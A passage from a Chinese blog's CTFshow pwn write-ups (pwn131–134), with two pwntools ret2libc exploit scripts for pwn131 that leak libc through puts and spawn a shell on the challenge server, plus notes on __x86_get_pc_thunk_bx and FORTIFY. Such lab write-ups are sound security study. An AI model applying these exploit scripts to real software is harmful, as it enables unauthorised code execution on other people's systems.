<p>32位程序，relro为full，除了canary保护全开</p>
<p>程序非常的简单，直接贴脸给大了</p>
<p>先接收程序输出的main函数的地址，计算出pie的基址，然后ret2libc即可</p>
<p>因为需要再调用一次ctfshow函数，所以对ebx进行了还原（追踪ebx的变化可以看到ebx的值是got表的首地址）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">elf = ELF(&#x27;../pwn131&#x27;)</span><br><span class="line">#p = process(&#x27;../pwn131&#x27;)</span><br><span class="line">#p = gdb.debug(&#x27;../pwn131&#x27;,&#x27;b main&#x27;)</span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;,28168)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#x27;main addr is here :\n&#x27;)</span><br><span class="line">main = int(p.recvline(),16)</span><br><span class="line">print(hex(main))</span><br><span class="line"></span><br><span class="line">pie_base = main - elf.sym[&#x27;main&#x27;]</span><br><span class="line">ctfshow = pie_base + elf.sym[&#x27;ctfshow&#x27;]</span><br><span class="line">puts_plt = pie_base + elf.sym[&#x27;puts&#x27;]</span><br><span class="line">puts_got = pie_base + elf.got[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line">offset = 0x88 + 0x4</span><br><span class="line">ebx = pie_base + 0x2fc0</span><br><span class="line"></span><br><span class="line">payload = cyclic(offset - 0x8) + p32(ebx) + cyclic(0x4) + p32(puts_plt) + p32(ctfshow) + p32(puts_got)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">puts = u32(p.recvuntil(&#x27;\xf7&#x27;)[-4:])	</span><br><span class="line">#puts = u32(p.recv())	</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&quot;puts&quot;,puts)</span><br><span class="line">libc_base = puts - libc.dump(&#x27;puts&#x27;)</span><br><span class="line">system = libc_base + libc.dump(&#x27;system&#x27;)</span><br><span class="line">bin_sh = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line"></span><br><span class="line">payload = cyclic(offset) + p32(system) + cyclic(0x4) + p32(bin_sh) </span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">elf = ELF(&#x27;../pwn131&#x27;)</span><br><span class="line">#p = process(&#x27;../pwn131&#x27;)</span><br><span class="line">#p = gdb.debug(&#x27;../pwn131&#x27;,&#x27;b main&#x27;)</span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;,28168)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#x27;main addr is here :\n&#x27;)</span><br><span class="line">main = int(p.recvline(),16)</span><br><span class="line">print(hex(main))</span><br><span class="line"></span><br><span class="line">pie_base = main - elf.sym[&#x27;main&#x27;]</span><br><span class="line">puts_plt = pie_base + elf.sym[&#x27;puts&#x27;]</span><br><span class="line">puts_got = pie_base + elf.got[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line">offset = 0x88 + 0x4</span><br><span class="line">ebx = pie_base + 0x2fc0</span><br><span class="line"></span><br><span class="line">payload = cyclic(offset) + p32(puts_plt) + p32(main) + p32(puts_got)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">puts = u32(p.recvuntil(&#x27;\xf7&#x27;)[-4:])	</span><br><span class="line">#puts = u32(p.recv())	</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&quot;puts&quot;,puts)</span><br><span class="line">libc_base = puts - libc.dump(&#x27;puts&#x27;)</span><br><span class="line">system = libc_base + libc.dump(&#x27;system&#x27;)</span><br><span class="line">bin_sh = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line"></span><br><span class="line">payload = cyclic(offset) + p32(system) + cyclic(0x4) + p32(bin_sh) </span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="x86-get-pc-thunk-bx函数知识补充"><a href="#x86-get-pc-thunk-bx函数知识补充" class="headerlink" title="__x86_get_pc_thunk_bx函数知识补充"></a>__x86_get_pc_thunk_bx函数知识补充</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">就是读取eip的值给ebx</span><br><span class="line">参考链接：https://blog.hutao.tech/posts/x86-get-pc-thunk/</span><br></pre></td></tr></table></figure>

<h4 id="pwn132"><a href="#pwn132" class="headerlink" title="pwn132"></a>pwn132</h4><p><img src="/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20240920142031875.png" alt="image-20240920142031875"></p>
<p>64位保护全开</p>
<p>非常直白非常简单，直接hack</p>
<p>输入CTFshow-daniu之后就能getshell了。</p>
<p>本题的知识点是FORTIFY保护</p>
<h5 id="FORTIFY保护知识补充"><a href="#FORTIFY保护知识补充" class="headerlink" title="FORTIFY保护知识补充"></a>FORTIFY保护知识补充</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">FORTIFY 是一种安全机制，旨在增强 C 和 C++ 程序的安全性，特别是针对缓冲区溢出等常见漏洞。它是 GNU C Library（glibc）的一部分，通常与 GCC（GNU Compiler Collection）一起使用。FORTIFY 通过在编译时对某些标准库函数进行替换和增强，来提供额外的运行时检查。</span><br><span class="line"></span><br><span class="line">### 1. FORTIFY 的工作原理</span><br><span class="line"></span><br><span class="line">FORTIFY 主要通过以下方式工作：</span><br><span class="line"></span><br><span class="line">- **编译时检查**：当使用 `-D_FORTIFY_SOURCE=1` 或 `-D_FORTIFY_SOURCE=2` 编译时，编译器会对某些函数进行增强。这些函数包括字符串操作、内存操作等，常见的有 `strcpy`、`strcat`、`memcpy` 等。</span><br><span class="line">- **替换函数**：FORTIFY 会用安全版本的函数替换这些标准库函数。例如，`strcpy` 可能会被替换为 `__fortify_strcpy`，该函数会在运行时检查目标缓冲区的大小，以防止缓冲区溢出。</span><br><span class="line">- **运行时检查**：在运行时，FORTIFY 会检查传递给这些函数的参数，确保它们不会导致缓冲区溢出或其他安全问题。</span><br><span class="line"></span><br><span class="line">### 2. FORTIFY 的级别</span><br><span class="line"></span><br><span class="line">FORTIFY 有两个级别：</span><br><span class="line"></span><br><span class="line">- **级别 1**：基本的安全检查，适用于大多数情况。它会对常见的字符串和内存操作函数进行检查。</span><br><span class="line">- **级别 2**：更严格的检查，提供更强的保护。它会对更多的函数进行检查，并且在某些情况下会进行更严格的参数验证。</span><br><span class="line"></span><br><span class="line">### 3. 启用 FORTIFY</span><br><span class="line"></span><br><span class="line">要启用 FORTIFY，通常在编译时添加以下选项：</span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line">gcc -D_FORTIFY_SOURCE=2 -O2 your_program.c -o your_program</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">- `-D_FORTIFY_SOURCE=2`：启用 FORTIFY 保护。</span><br><span class="line">- `-O2`：启用优化级别 2，FORTIFY 保护通常与优化级别一起使用。</span><br><span class="line"></span><br><span class="line">### 4. 优点和局限性</span><br><span class="line"></span><br><span class="line">#### 优点：</span><br><span class="line">- **增强安全性**：通过运行时检查，FORTIFY 可以有效地防止缓冲区溢出等常见漏洞。</span><br><span class="line">- **易于使用**：只需在编译时添加宏定义，无需修改源代码。</span><br><span class="line"></span><br><span class="line">#### 局限性：</span><br><span class="line">- **性能开销**：虽然 FORTIFY 的开销通常较小，但在某些情况下，运行时检查可能会导致性能下降。</span><br><span class="line">- **不全面**：FORTIFY 只能保护特定的函数，对于其他类型的漏洞（如整数溢出、使用后释放等）没有保护。</span><br><span class="line"></span><br><span class="line">### 5. 总结</span><br><span class="line"></span><br><span class="line">FORTIFY 是一种有效的安全机制，通过在编译时增强标准库函数的安全性，帮助开发者防止常见的安全漏洞。尽管它不能替代其他安全措施（如代码审计、使用安全编程实践等），但它是提高 C 和 C++ 程序安全性的一种有用工具。</span><br></pre></td></tr></table></figure>

<h4 id="pwn133"><a href="#pwn133" class="headerlink" title="pwn133"></a>pwn133</h4><p><img src="/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20240920143816875.png" alt="image-20240920143816875"></p>
<p>64位保护全开，可以看到fortified的等级提高了</p>
<p><img src="/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20240920172809154.png" alt="image-20240920172809154"></p>
<p>如果按照上题的思路输入CTFshow-daniu的话，在执行__print_chk的时候程序就崩溃了，可能是因为指向的是一个错误的地址或者fortify在检测的时候发挥了作用，直接终止了程序。</p>
<p><img src="/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20240920175251183.png" alt="image-20240920175251183"></p>
<p>程序中存在后门函数_chk，输入check时会执行</p>
<h4 id="pwn134"><a href="#pwn134" class="headerlink" title="pwn134"></a>pwn134</h4><p><img src="/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20240920175716957.png" alt="image-20240920175716957"></p>
<p>仍然是存在后门函数的，nc连接之后输入Exit，之后等待20秒就能得到flag</p>
<p>说实话，这三题有点水吧</p>
<p>ok，又结束一个小节。</p>
<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/zuoanfengxi/p/12610567.html</span><br><span class="line">https://www.ascotbe.com/2021/03/26/StackOverflow_Linux_0x03/#ssp-stack-smashing-protector</span><br><span class="line">https://xz.aliyun.com/t/13074?time__1311=GqmhBKqIxGxBMx%2Boxfxmq%3Dba34GK4vYx</span><br><span class="line">https://www.cnblogs.com/ichunqiu/p/11350476.html</span><br><span class="line">https://bbs.kanxue.com/thread-268715.htm#msg_header_h2_4</span><br><span class="line">https://zhuanlan.zhihu.com/p/78076171</span><br><span class="line">https://blog.hutao.tech/posts/x86-get-pc-thunk/</span><br><span class="line">https://ysynrh77rj.feishu.cn/docx/JygndITuRoX06pxMpKAcltXCnCP(官方wp)</span><br></pre></td></tr></table></figure>

</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://zx2023qj.github.io">zx</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://zx2023qj.github.io/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/">https://zx2023qj.github.io/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://zx2023qj.github.io" target="_blank">zx's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pwn/">pwn</a><a class="post-meta__tags" href="/tags/ctfshow/">ctfshow</a></div><div class="post_share"><div class="social-share" data-image="/img/3.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/10/01/newstarctf-pwn-week1-5/" title="newstarctf_pwn_week1-5"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">newstarctf_pwn_week1-5</div></div></a></div><div class="next-post pull-right"><a href="/2024/09/19/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A01/" title="机器学习1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">机器学习1</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/06/28/pwn0-34/" title="pwn0-34"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-06-28</div><div class="title">pwn0-34</div></div></a></div><div><a href="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/" title="pwn35-90栈溢出"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-03</div><div class="title">pwn35-90栈溢出</div></div></a></div><div><a href="/2024/09/03/brop/" title="brop"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-03</div><div class="title">brop</div></div></a></div><div><a href="/2024/09/05/pwn91-100%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" title="pwn91-100格式化字符串"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-05</div><div class="title">pwn91-100格式化字符串</div></div></a></div><div><a href="/2024/09/07/pwn101-110%E6%95%B4%E6%95%B0%E5%AE%89%E5%85%A8/" title="pwn101-110整数安全"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-07</div><div class="title">pwn101-110整数安全</div></div></a></div><div><a href="/2024/10/13/pwn135-159%E5%A0%86%E5%89%8D%E7%BD%AE/" title="pwn135-159堆前置"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-13</div><div class="title">pwn135-159堆前置</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/3.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">zx</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">37</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">33</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">22</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/zx2023qj"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6"><span class="toc-number">1.</span> <span class="toc-text">0x04 bypass安全机制</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn111"><span class="toc-number">1.1.</span> <span class="toc-text">pwn111</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn112"><span class="toc-number">1.2.</span> <span class="toc-text">pwn112</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn113"><span class="toc-number">1.3.</span> <span class="toc-text">pwn113</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%87%E8%83%BDgadget-csu"><span class="toc-number">1.3.1.</span> <span class="toc-text">万能gadget(csu)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#st-mode%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85"><span class="toc-number">1.3.2.</span> <span class="toc-text">st_mode知识补充</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn114"><span class="toc-number">1.4.</span> <span class="toc-text">pwn114</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#signal%E5%87%BD%E6%95%B0%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85"><span class="toc-number">1.4.1.</span> <span class="toc-text">signal函数知识补充</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn115"><span class="toc-number">1.5.</span> <span class="toc-text">pwn115</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn116"><span class="toc-number">1.6.</span> <span class="toc-text">pwn116</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn117"><span class="toc-number">1.7.</span> <span class="toc-text">pwn117</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#stack-chk-fail%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85"><span class="toc-number">1.7.1.</span> <span class="toc-text">stack_chk_fail知识补充</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn118"><span class="toc-number">1.8.</span> <span class="toc-text">pwn118</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn119"><span class="toc-number">1.9.</span> <span class="toc-text">pwn119</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#fork%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85"><span class="toc-number">1.9.1.</span> <span class="toc-text">fork知识补充</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn120"><span class="toc-number">1.10.</span> <span class="toc-text">pwn120</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn121"><span class="toc-number">1.11.</span> <span class="toc-text">pwn121</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn122"><span class="toc-number">1.12.</span> <span class="toc-text">pwn122</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#swtich%E5%87%BD%E6%95%B0%E7%9A%84%E5%AE%9E%E7%8E%B0"><span class="toc-number">1.12.1.</span> <span class="toc-text">swtich函数的实现</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#call%E6%8C%87%E4%BB%A4%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85"><span class="toc-number">1.12.2.</span> <span class="toc-text">call指令知识补充</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn123"><span class="toc-number">1.13.</span> <span class="toc-text">pwn123</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn124"><span class="toc-number">1.14.</span> <span class="toc-text">pwn124</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#strcmp%E5%87%BD%E6%95%B0%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85"><span class="toc-number">1.14.1.</span> <span class="toc-text">strcmp函数知识补充</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn125"><span class="toc-number">1.15.</span> <span class="toc-text">pwn125</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn126"><span class="toc-number">1.16.</span> <span class="toc-text">pwn126</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ASLR%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85%EF%BC%88address-space-layout-randomization%EF%BC%89"><span class="toc-number">1.16.1.</span> <span class="toc-text">ASLR知识补充（address space layout randomization）</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn127"><span class="toc-number">1.17.</span> <span class="toc-text">pwn127</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn128"><span class="toc-number">1.18.</span> <span class="toc-text">pwn128</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#aslr%E5%92%8Cpie%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">1.18.1.</span> <span class="toc-text">aslr和pie的区别</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn129"><span class="toc-number">1.19.</span> <span class="toc-text">pwn129</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#vsyscall%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85"><span class="toc-number">1.19.1.</span> <span class="toc-text">vsyscall知识补充</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn130"><span class="toc-number">1.20.</span> <span class="toc-text">pwn130</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn131"><span class="toc-number">1.21.</span> <span class="toc-text">pwn131</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#x86-get-pc-thunk-bx%E5%87%BD%E6%95%B0%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85"><span class="toc-number">1.21.1.</span> <span class="toc-text">__x86_get_pc_thunk_bx函数知识补充</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn132"><span class="toc-number">1.22.</span> <span class="toc-text">pwn132</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#FORTIFY%E4%BF%9D%E6%8A%A4%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85"><span class="toc-number">1.22.1.</span> <span class="toc-text">FORTIFY保护知识补充</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn133"><span class="toc-number">1.23.</span> <span class="toc-text">pwn133</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn134"><span class="toc-number">1.24.</span> <span class="toc-text">pwn134</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">1.25.</span> <span class="toc-text">参考链接</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/08/%E6%95%B0%E4%B8%80/" title="数一">数一</a><time datetime="2025-03-08T14:27:47.000Z" title="发表于 2025-03-08 22:27:47">2025-03-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/03/%E8%BF%9B%E5%BA%A6/" title="进度">进度</a><time datetime="2025-03-03T07:15:41.000Z" title="发表于 2025-03-03 15:15:41">2025-03-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/02/26/leetcode100hot/" title="leetcode100hot">leetcode100hot</a><time datetime="2025-02-26T01:35:41.000Z" title="发表于 2025-02-26 09:35:41">2025-02-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/02/25/%E8%80%83%E7%A0%94%E6%8B%A9%E6%A0%A1/" title="考研择校">考研择校</a><time datetime="2025-02-25T08:54:42.000Z" title="发表于 2025-02-25 16:54:42">2025-02-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/01/02/%E4%B9%A0%E6%A6%82%E5%A4%8D%E4%B9%A0/" title="习概复习">习概复习</a><time datetime="2025-01-02T07:42:39.000Z" title="发表于 2025-01-02 15:42:39">2025-01-02</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By zx</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>